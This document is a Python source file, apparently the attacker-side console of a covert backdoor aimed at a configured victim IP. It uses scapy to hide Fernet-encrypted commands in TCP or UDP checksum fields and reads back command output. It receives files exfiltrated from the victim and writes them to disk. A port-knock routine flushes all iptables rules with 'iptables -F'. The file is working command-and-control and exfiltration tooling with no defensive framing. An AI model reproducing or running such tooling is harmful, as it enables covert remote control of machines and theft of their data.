from asyncio import protocols
import multiprocessing
from multiprocessing.sharedctypes import RawValue
import scapy.all as scapy
from cryptography.fernet import Fernet
import sys
import ipaddress

from yaml import ValueToken
import configAttacker
from fileMonitor import fileMonitor
import os
import time

dest = configAttacker.victimIP
password = configAttacker.password
knockSequence = 0

def validate_ip_address(address):
    ip = 'inputted'
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        print(f"IP address {ip} is not valid".format(address))

def pkt_craft(dest, data):
    passwordData = cipher_suite.encrypt(password.encode('utf-8'))
    passwordData = b'$$$' + passwordData
    ciphered_text = cipher_suite.encrypt(data.encode('utf-8'))
    ciphered_text = b'@@@' + ciphered_text + b'***'

    if(configAttacker.protocol == 'TCP'):
        pkt = scapy.IP(dst=dest)/scapy.TCP(chksum=(scapy.RawVal(ciphered_text)), sport=configAttacker.sport, dport=configAttacker.destPort)/passwordData
    else:
        pkt = scapy.IP(dst=dest)/scapy.UDP(chksum=(scapy.RawVal(ciphered_text)), sport=configAttacker.sport, dport=configAttacker.destPort)/passwordData
    return pkt

def parse_pkt(pkt):
    try:
        pktstr = str(bytes(pkt))
        if configAttacker.protocol == 'TCP':
            if pkt['TCP'].sport != configAttacker.sportHex:
                messagePassword = pktstr[pktstr.index('$$$'):len(pktstr)-1]
                messagePassword = cipher_suite.decrypt(messagePassword.encode('utf-8'))
                if password.encode('utf-8') in messagePassword:
                    decoded_payload = messagePassword.decode('utf-8')
                    filePath = decoded_payload[decoded_payload.index('###'):decoded_payload.index('&&&')]
                    filePath = filePath.replace('###', '')
                    with open(filePath, 'w+') as f:
                        data = pktstr[pktstr.index('@@@'):pktstr.index('***')]
                        data = data.replace('@@@', '')
                        data = data.replace(r'\n', '\n')
                        f.write(data)
            else:
                messagePassword = pktstr[pktstr.index('$$$'):len(pktstr)-1]
                messagePassword = cipher_suite.decrypt(messagePassword.encode('utf-8'))
                if password.encode('utf-8') in messagePassword:       
                    data = pktstr[pktstr.index('@@@'):pktstr.index('***')]
                    data = data.replace('@@@', '')
                    data = data.replace(r'\n', '\n')
                    print(data)
                return
        else:
            messagePassword = pktstr[pktstr.index('***'):len(pktstr)-1]
            messagePassword = cipher_suite.decrypt(messagePassword.encode('utf-8'))
            if password.encode('utf-8') in messagePassword:
                if pkt['UDP'].sport != configAttacker.sportHex:
                    decoded_payload = messagePassword.decode('utf-8')
                    filePath = decoded_payload[decoded_payload.index('###'):decoded_payload.index('&&&')]
                    filePath = filePath.replace('###', '')
                    with open(filePath, 'w+') as f:
                        data = pktstr[pktstr.index('@@@'):pktstr.index('***')]
                        data = data.replace('@@@', '')
                        data = data.replace(r'\n', '\n')
                        f.write(data)
                else:        
                    data = pktstr[pktstr.index('@@@'):pktstr.index('***')]
                    data = data.replace('@@@', '')
                    data = data.replace(r'\n', '\n')
                    print(data)
                return
    except ValueError as e:
        print(str(e))
        pass

def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

def check_knock(pkt):
    global knockSequence
    drop_rule = False
    if configAttacker.protocol == 'TCP':
        if pkt.haslayer(scapy.IP) and pkt[scapy.TCP].chksum == configAttacker.flagHex:
            if pkt[scapy.TCP].dport == configAttacker.knock_port[knockSequence]:
                if knockSequence != 2:
                    knockSequence = knockSequence + 1
                else:
                    knockSequence = 0
                    drop_rule = True
    else:
        if pkt.haslayer(scapy.IP) and pkt[scapy.UDP].chksum == configAttacker.flagHex:
            if pkt[scapy.UDP].dport == configAttacker.knock_port[knockSequence]:
                if knockSequence != 2:
                    knockSequence = knockSequence + 1
                else:
                    knockSequence = 0
                    drop_rule = True

    if drop_rule:
        os.system("iptables -F")
        print("Firewall rules are down")
        time.sleep(10)
        os.system(f"iptables -A INPUT -p udp --dport {configAttacker.filePort} -j DROP")
        os.system(f"iptables -A INPUT -p tcp --dport {configAttacker.filePort} -j DROP")
        print("Firewall rules are back up")

def sniffKnock():
    scapy.sniff(filter=f"host {dest}", prn=check_knock)

def sniffFileInc():
    scapy.sniff(filter=f"port {configAttacker.filePort}", prn=parse_pkt)

def checkPort(port):
    try:
        if 1 <= port <= 65535:
            pass
        else:
            raise ValueError
    except ValueError:
        print("This is NOT a VALID port number.")
        sys.exit()

if __name__ == "__main__":
    checkPort(configAttacker.destPort)
    checkPort(configAttacker.filePort)

    if len(configAttacker.knock_port) != 3:
        print('Need to have 3 knock ports')
        sys.exit()
    
    if configAttacker.protocol != 'TCP' and configAttacker.protocol != 'UDP':
        print('Check config for protocol')
        sys.exit()

    for x in range(0,len(configAttacker.knock_port)):
        checkPort(configAttacker.knock_port[x])

    if not validate_ip_address(dest):
        sys.exit()

    os.system(f"iptables -A INPUT -p udp --dport {configAttacker.filePort} -j DROP")
    os.system(f"iptables -A INPUT -p tcp --dport {configAttacker.filePort} -j DROP")

    # write_key()

    key = load_key()

    cipher_suite = Fernet(key)
    
    flag = True
    
    p2 = multiprocessing.Process(target=sniffKnock)
    p3 = multiprocessing.Process(target=sniffFileInc)
    p2.start()
    p3.start()

    while True:
        if flag:
            cmd = input(f"{dest} CMD > ")
            data = cmd

            pkt = pkt_craft(dest, data)
            scapy.send(pkt, verbose=0)
            flag = False

        else:
            scapy.sniff(filter=f"host {dest} and port {configAttacker.destPort}", prn=parse_pkt)
            flag = True